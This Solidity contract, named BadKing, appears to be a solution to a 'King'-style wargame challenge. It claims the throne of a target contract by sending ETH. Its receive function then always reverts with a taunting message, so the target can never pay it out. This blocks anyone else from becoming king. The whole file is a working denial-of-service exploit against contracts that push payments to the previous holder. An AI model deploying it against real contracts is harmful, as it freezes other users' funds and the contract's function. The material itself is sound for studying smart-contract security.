// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract BadKing {

    function becomeKing(address payable _target) public payable{
        (bool success, ) = _target.call.value(msg.value)("");
        require(success, "Failed to send ETH");
    }
    
    function seeBalance() public view returns (uint){
        return address(this).balance;
    }

    receive() external payable {
        revert("lol you failed so bad :D");
    }
}

